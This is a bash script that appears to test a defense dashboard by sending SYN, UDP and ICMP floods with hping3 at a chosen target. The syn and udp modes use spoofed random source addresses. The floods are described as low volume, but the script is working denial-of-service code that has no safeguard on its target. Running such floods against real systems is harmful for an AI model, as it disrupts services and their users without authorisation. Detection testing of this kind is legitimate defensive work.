#!/bin/bash
# ===========================================
# DDoS Simulation (Low Volume for Testing)
# ===========================================
# Simulates various DDoS attack patterns
# Uses controlled traffic volumes for testing
# ===========================================

TARGET=${1:-"192.168.1.1"}
PORT=${2:-"80"}
DURATION=${3:-30}  # seconds
ATTACK_TYPE=${4:-"syn"}  # syn, udp, icmp

echo "╔═══════════════════════════════════════════════════════╗"
echo "║   DDoS Simulation (Low Volume Testing)                 ║"
echo "╚═══════════════════════════════════════════════════════╝"
echo ""
echo "Target: $TARGET:$PORT"
echo "Duration: $DURATION seconds"
echo "Attack Type: $ATTACK_TYPE"
echo ""
echo "⚠️  This is a LOW VOLUME test - not a real DDoS!"
echo ""
echo "Starting in 5 seconds... (Ctrl+C to cancel)"
sleep 5

# Check if hping3 is installed
if ! command -v hping3 &> /dev/null; then
    echo "Error: hping3 not found. Install with: sudo apt install hping3"
    exit 1
fi

run_attack() {
    local attack_name=$1
    local attack_args=$2
    
    echo ""
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "Running: $attack_name for $DURATION seconds"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    # Run with timeout
    timeout $DURATION hping3 $attack_args $TARGET 2>&1 | head -n 50
    
    echo ""
    echo "Attack phase complete."
}

case $ATTACK_TYPE in
    syn)
        # SYN Flood (low rate for testing)
        run_attack "SYN Flood" "-S -p $PORT -i u1000 --rand-source"
        ;;
    udp)
        # UDP Flood
        run_attack "UDP Flood" "--udp -p $PORT -i u1000 --rand-source"
        ;;
    icmp)
        # ICMP Flood (Ping flood)
        run_attack "ICMP Flood" "--icmp -i u1000"
        ;;
    smurf)
        # Smurf attack simulation
        echo "Smurf attack requires broadcast address - simulating with ICMP flood"
        run_attack "ICMP Flood (Smurf simulation)" "--icmp -i u500"
        ;;
    all)
        echo "Running all attack types in sequence..."
        
        DURATION=$((DURATION / 3))  # Divide time among attacks
        
        run_attack "SYN Flood" "-S -p $PORT -i u1000"
        sleep 5
        
        run_attack "UDP Flood" "--udp -p $PORT -i u1000"
        sleep 5
        
        run_attack "ICMP Flood" "--icmp -i u1000"
        ;;
    *)
        echo "Unknown attack type: $ATTACK_TYPE"
        echo "Options: syn, udp, icmp, smurf, all"
        exit 1
        ;;
esac

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "DDoS simulation complete."
echo "Check the defense dashboard for detection alerts."
echo "Expected: Traffic anomaly detection, high volume alerts"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
